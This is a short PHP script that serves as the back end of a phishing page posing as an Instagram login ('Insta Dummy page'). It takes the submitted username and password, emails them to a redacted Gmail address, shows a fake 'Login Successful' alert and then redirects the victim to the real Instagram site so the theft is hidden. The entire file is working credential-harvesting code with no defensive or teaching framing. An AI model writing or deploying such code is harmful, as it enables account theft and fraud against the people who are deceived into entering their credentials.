<?php

//varible setting
$username = $_REQUEST['o_name'];  // fetch username
 $passcode = $_REQUEST['pass_u'];  // fetch password
 $subject = "Someone Login ! Insta Dummy page";
 $to ="xxxxxxxx@gmail.com";
 
 $txt = "Username : ". $username. "\r\nPassword : ". $passcode ; // email body (i) username [break] (ii) password;
 


// check input fields
if (empty($username)|| empty($passcode)){ // name or message
echo"<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
    window.history.go(-1);
    </script>";
}
else 
{ 
    mail($to,$subject,$txt); // send an email 
    echo"<script type='text/javascript'>alert('Login Successful ');
     // Simulate an HTTP redirect: 
    window.location.replace('http://www.instagram.com');
    </script>";
}


?>
